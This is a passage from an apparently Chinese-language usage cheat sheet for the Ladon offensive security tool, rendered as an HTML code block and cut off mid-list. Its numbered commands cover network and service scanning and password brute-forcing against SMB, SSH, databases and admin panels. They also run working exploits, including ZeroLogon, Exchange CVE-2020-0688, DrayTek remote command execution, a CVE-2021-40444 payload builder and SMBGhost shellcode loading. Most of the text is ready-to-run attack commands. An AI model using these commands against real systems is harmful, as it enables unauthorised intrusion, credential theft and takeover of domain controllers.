class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br></pre></td><td class="code"><pre><code class="hljs clean">### <span class="hljs-number">001</span> 自定义线程扫描<br>例子：扫描目标<span class="hljs-number">10.1</span><span class="hljs-number">.2</span>段是否存在MS17010漏洞<br>单线程：Ladon <span class="hljs-number">10.1</span><span class="hljs-number">.2</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> MS17010 t=<span class="hljs-number">1</span><br><span class="hljs-number">80</span>线程：Ladon noping <span class="hljs-number">10.1</span><span class="hljs-number">.2</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> MS17010 t=<span class="hljs-number">80</span><br>在高强度防护下的网络默认线程无法扫描，必须单线程<br><br>### <span class="hljs-number">002</span> Socks5代理扫描<br>例子：扫描目标<span class="hljs-number">10.1</span><span class="hljs-number">.2</span>段是否存在MS17010漏洞（必须加noping）<br>Ladon noping <span class="hljs-number">10.1</span><span class="hljs-number">.2</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> MS17010<br>详见：http:<span class="hljs-comment">//k8gege.org/Ladon/proxy.html</span><br><br>### <span class="hljs-number">003</span> 网段扫描/批量扫描<br>CIDR格式：不只是/<span class="hljs-number">24</span>/<span class="hljs-number">16</span>/<span class="hljs-number">8</span>(所有)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> 扫描模块<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">16</span> 扫描模块<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">8</span>  扫描模块<br><br>字母格式：仅C段B段A段 顺序排序<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/c 扫描模块<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/b 扫描模块<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/a 扫描模块<br><br>TXT格式<br>##### <span class="hljs-number">004</span> ICMP批量扫描C段列表存活主机<br>Ladon ip24.txt ICMP<br><br>##### <span class="hljs-number">005</span> ICMP批量扫描B段列表存活主机<br>Ladon ip16.txt ICMP<br><br>##### <span class="hljs-number">006</span> ICMP批量扫描cidr列表(如某国IP段)<br>Ladon cidr.txt ICMP<br><br>##### <span class="hljs-number">007</span> ICMP批量扫描域名是否存活<br>Ladon domain.txt ICMP<br><br>##### <span class="hljs-number">008</span> ICMP批量扫描机器是否存活<br>Ladon host.txt ICMP<br><br>##### <span class="hljs-number">009</span> 批量识别URL列表CMS<br>Ladon url.txt WhatCMS<br><br>##### <span class="hljs-number">010</span> 批量检测DrayTek路由器版本、漏洞、弱口令<br>Ladon url.txt DraytekPoc<br><br>##### <span class="hljs-number">011</span> 批量解密Base64密码<br>Ladon str.txt DeBase64<br><br>### 资产扫描、指纹识别、服务识别、存活主机、端口扫描<br><br>##### <span class="hljs-number">012</span> ICMP扫描存活主机(最快)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> ICMP<br><br>##### <span class="hljs-number">013</span> Ping探测存活主机(调用系统Ping命令 回显ms、ttl等信息)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> Ping<br><br>##### <span class="hljs-number">014</span> 多协议探测存活主机 （IP、机器名、MAC/域名、制造商/系统版本）<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> OnlinePC<br><br>##### <span class="hljs-number">015</span> 多协议识别操作系统 （IP、机器名、操作系统版本、开放服务）<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> OsScan<br><br>##### <span class="hljs-number">016</span> OXID探测多网卡主机<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> EthScan<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> OxidScan<br><br>##### <span class="hljs-number">017</span> DNS探测多网卡主机<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> DnsScan<br><br>##### <span class="hljs-number">018</span> 多协议扫描存活主机IP<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> OnlineIP<br><br>##### <span class="hljs-number">019</span> 扫描SMB漏洞MS17010 （IP、机器名、漏洞编号、操作系统版本）<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> MS17010<br><br>##### <span class="hljs-number">020</span> SMBGhost漏洞检测 CVE<span class="hljs-number">-2020</span><span class="hljs-number">-0796</span> （IP、机器名、漏洞编号、操作系统版本）<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> SMBGhost<br><br>##### <span class="hljs-number">021</span> 扫描Web信息/Http服务<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WebScan<br><br>##### <span class="hljs-number">022</span> 扫描C段站点URL域名<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> UrlScan<br><br>##### <span class="hljs-number">023</span> 扫描C段站点URL域名<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> SameWeb<br><br>##### <span class="hljs-number">024</span> 扫描子域名、二级域名<br>Ladon baidu.com SubDomain<br><br>##### <span class="hljs-number">025</span> 域名解析IP、主机名解析IP<br>Ladon baidu.com DomainIP<br>Ladon baidu.com HostIP<br><br>##### <span class="hljs-number">026</span> DNS查询域内机器、IP (条件域内)<br>Ladon AdiDnsDump <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> (Domain IP)<br><br>##### <span class="hljs-number">027</span> 查询域内机器、IP (条件域内)<br>Ladon GetDomainIP<br><br>##### <span class="hljs-number">028</span> 扫描C段端口、指定端口扫描<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> PortScan<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> PortScan <span class="hljs-number">80</span>,<span class="hljs-number">445</span>,<span class="hljs-number">3389</span><br><br>##### <span class="hljs-number">029</span> 扫描C段WEB及识别CMS（<span class="hljs-number">86</span>+Web指纹识别）<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WhatCMS<br><br>##### <span class="hljs-number">030</span> 扫描思科设备<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> CiscoScan<br>Ladon http:<span class="hljs-comment">//192.168.1.8 CiscoScan</span><br><br>##### <span class="hljs-number">031</span> 枚举Mssql数据库主机 （数据库IP、机器名、SQL版本）<br>Ladon EnumMssql<br><br>##### <span class="hljs-number">032</span> 枚举网络共享资源 （域、IP、主机名\共享路径）<br>Ladon EnumShare<br><br>##### <span class="hljs-number">033</span> 扫描LDAP服务器(探测域控)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> LdapScan<br><br>##### <span class="hljs-number">034</span> 扫描FTP服务器<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> FtpScan<br><br>### 暴力破解/网络认证/弱口令/密码爆破/数据库/网站后台/登陆口/系统登陆<br><br>密码爆破详解参考SSH：http:<span class="hljs-comment">//k8gege.org/Ladon/sshscan.html</span><br><br>##### <span class="hljs-number">035</span> <span class="hljs-number">445</span>端口 SMB密码爆破(Windows)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> SmbScan<br><br>##### <span class="hljs-number">036</span> <span class="hljs-number">135</span>端口 Wmi密码爆破(Windowns)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WmiScan<br><br>##### <span class="hljs-number">037</span> <span class="hljs-number">389</span>端口 LDAP服务器、AD域密码爆破(Windows)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> LdapScan<br><br>##### <span class="hljs-number">038</span> <span class="hljs-number">5985</span>端口 Winrm密码爆破(Windowns)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WinrmScan.ini<br><br>##### <span class="hljs-number">039</span> <span class="hljs-number">445</span>端口 SMB NTLM HASH爆破(Windows)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> SmbHashScan<br><br>##### <span class="hljs-number">040</span> <span class="hljs-number">135</span>端口 Wmi NTLM HASH爆破(Windows)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WmiHashScan<br><br>##### <span class="hljs-number">041</span> <span class="hljs-number">22</span>端口 SSH密码爆破(Linux)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> SshScan<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>:<span class="hljs-number">22</span> SshScan<br><br>##### <span class="hljs-number">042</span> <span class="hljs-number">1433</span>端口 Mssql数据库密码爆破<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> MssqlScan<br><br>##### <span class="hljs-number">043</span> <span class="hljs-number">1521</span>端口 Oracle数据库密码爆破<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> OracleScan<br><br>##### <span class="hljs-number">044</span> <span class="hljs-number">3306</span>端口 Mysql数据库密码爆破<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> MysqlScan<br><br>##### <span class="hljs-number">045</span> <span class="hljs-number">7001</span>端口 Weblogic后台密码爆破<br>Ladon http:<span class="hljs-comment">//192.168.1.8:7001/console WeblogicScan</span><br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WeblogicScan<br><br>##### <span class="hljs-number">046</span> <span class="hljs-number">5900</span>端口 VNC远程桌面密码爆破<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> VncScan<br><br>##### <span class="hljs-number">047</span> <span class="hljs-number">21</span>端口 Ftp服务器密码爆破<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> FtpScan<br><br>##### <span class="hljs-number">048</span> <span class="hljs-number">8080</span>端口 Tomcat后台登陆密码爆破<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> TomcatScan<br>Ladon http:<span class="hljs-comment">//192.168.1.8:8080/manage TomcatScan</span><br><br>##### <span class="hljs-number">049</span> Web端口 <span class="hljs-number">401</span>基础认证密码爆破<br>Ladon http:<span class="hljs-comment">//192.168.1.8/login HttpBasicScan</span><br><br>##### <span class="hljs-number">050</span> <span class="hljs-number">445</span>端口 Impacket SMB密码爆破(Windowns)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> SmbScan.ini<br><br>##### <span class="hljs-number">051</span> <span class="hljs-number">445</span>端口 IPC密码爆破(Windowns)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> IpcScan.ini<br><br>##### <span class="hljs-number">052</span> <span class="hljs-number">139</span>端口Netbios协议Windows密码爆破<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> NbtScan<br><br>##### <span class="hljs-number">053</span> <span class="hljs-number">5985</span>端口Winrm协议Windows密码爆破<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WinrmScan<br><br>##### <span class="hljs-number">054</span> 网络摄像头密码爆破(内置默认密码)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> DvrScan<br><br>### 漏洞检测/Poc<br><br>##### <span class="hljs-number">055</span> SMB漏洞检测(CVE<span class="hljs-number">-2017</span><span class="hljs-number">-0143</span>/CVE<span class="hljs-number">-2017</span><span class="hljs-number">-0144</span>)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> MS17010<br><br>##### <span class="hljs-number">056</span> SMBGhost漏洞检测 CVE<span class="hljs-number">-2020</span><span class="hljs-number">-0796</span><br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> SMBGhost<br><br>##### <span class="hljs-number">057</span> Weblogic漏洞检测(CVE<span class="hljs-number">-2019</span><span class="hljs-number">-2725</span>/CVE<span class="hljs-number">-2018</span><span class="hljs-number">-2894</span>)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WeblogicPoc<br><br>##### <span class="hljs-number">058</span> PhpStudy后门检测(phpstudy <span class="hljs-number">2016</span>/phpstudy <span class="hljs-number">2018</span>)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> PhpStudyPoc<br><br>##### <span class="hljs-number">059</span> ActiveMQ漏洞检测(CVE<span class="hljs-number">-2016</span><span class="hljs-number">-3088</span>)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> ActivemqPoc<br><br>##### <span class="hljs-number">060</span> Tomcat漏洞检测(CVE<span class="hljs-number">-2017</span><span class="hljs-number">-12615</span>)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> TomcatPoc<br><br>##### <span class="hljs-number">061</span> Struts2漏洞检测(S2<span class="hljs-number">-005</span>/S2<span class="hljs-number">-009</span>/S2<span class="hljs-number">-013</span>/S2<span class="hljs-number">-016</span>/S2<span class="hljs-number">-019</span>/S2<span class="hljs-number">-032</span>/DevMode)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> Struts2Poc<br><br>##### <span class="hljs-number">062</span> DraytekPoc CVE<span class="hljs-number">-2020</span><span class="hljs-number">-8515</span>漏洞检测、Draytek版本探测、弱口令检测<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span> DraytekPoc<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> DraytekPoc<br><br>### 漏洞利用/Exploit<br>##### <span class="hljs-number">063</span> Weblogic漏洞利用(CVE<span class="hljs-number">-2019</span><span class="hljs-number">-2725</span>)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> WeblogicExp<br><br>##### <span class="hljs-number">064</span> Tomcat漏洞利用(CVE<span class="hljs-number">-2017</span><span class="hljs-number">-12615</span>)<br>Ladon <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.8</span>/<span class="hljs-number">24</span> TomcatExp<br><br>##### <span class="hljs-number">065</span> Windows <span class="hljs-number">0</span>day漏洞通用DLL注入执行CMD生成器(DLL仅<span class="hljs-number">5</span>KB)<br>Ladon CmdDll x86 calc<br>Ladon CmdDll x64 calc<br>Ladon CmdDll b64x86 YwBhAGwAYwA=<br>Ladon CmdDll b64x64 YwBhAGwAYwA=<br><br>##### <span class="hljs-number">066</span> CVE<span class="hljs-number">-2021</span><span class="hljs-number">-40444</span>  微软IE/Office <span class="hljs-number">0</span>day漏洞<br>Ladon CVE<span class="hljs-number">-2021</span><span class="hljs-number">-40444</span> MakeCab poc.dll<br>Ladon CVE<span class="hljs-number">-2021</span><span class="hljs-number">-40444</span> MakeHtml http:<span class="hljs-comment">//192.168.1.8</span><br><br>##### <span class="hljs-number">067</span> DraytekExp CVE<span class="hljs-number">-2020</span><span class="hljs-number">-8515</span>远程执行命令EXP<br>Ladon DraytekExp http:<span class="hljs-comment">//192.168.1.8  whoami</span><br><br>##### <span class="hljs-number">068</span> ZeroLogon CVE<span class="hljs-number">-2020</span><span class="hljs-number">-1472</span>域控提权(密码置空)<br>Ladon ZeroLogon dc.k8gege.org<br><br>##### <span class="hljs-number">069</span> CVE<span class="hljs-number">-2020</span><span class="hljs-number">-0688</span> Exchange序列化漏洞(.net <span class="hljs-number">4.0</span>)<br>Ladon cve<span class="hljs-number">-2020</span><span class="hljs-number">-0688</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.142</span> Administrator K8gege520<br><br>##### <span class="hljs-number">070</span> ForExec循环漏洞利用(Win10永恒之黑CVE<span class="hljs-number">-2020</span><span class="hljs-number">-0796</span>,成功退出以免目标蓝屏)<br>Ladon ForExec <span class="hljs-string">&quot;CVE-2020-0796-Exp -i 192.168.1.8 -p 445 -e --load-shellcode test.txt&quot;</span> <span class="hljs-number">80</span> <span class="hljs-string">&quot;Exploit finnished&quot;</span><br><br><br>### 文件下载、文件传输<br><br>##### <span class="hljs-number">071</span> HTTP下载<br>Ladon HttpDownLoad http:<span class="hljs-comment">//k8gege.org/Download/Ladon.rar</span><br><br>##### <span class="hljs-number">072</span> Ftp下载 <br>Ladon FtpDownLoad <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">21</span> admin admin test.exe<br><br>### 加密解密(HEX/Base64)<br><br>##### <span class="hljs-number">073</span> Hex加密解密<br>Ladon <span class="hljs-number">123456</span> EnHex<br>Ladon <span class="hljs-number">313233343536</span> DeHex<br><br>##### <span class="hljs-number">074</span> Base64加密解密<br>Ladon <span class="hljs-number">123456</span> EnBase64<br>Ladon MTIzNDU2 DeBase64<br><br>### 网络嗅探<br><br>##### <span class="hljs-number">075</span> Ftp密码嗅探 <br>Ladon FtpSniffer <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span 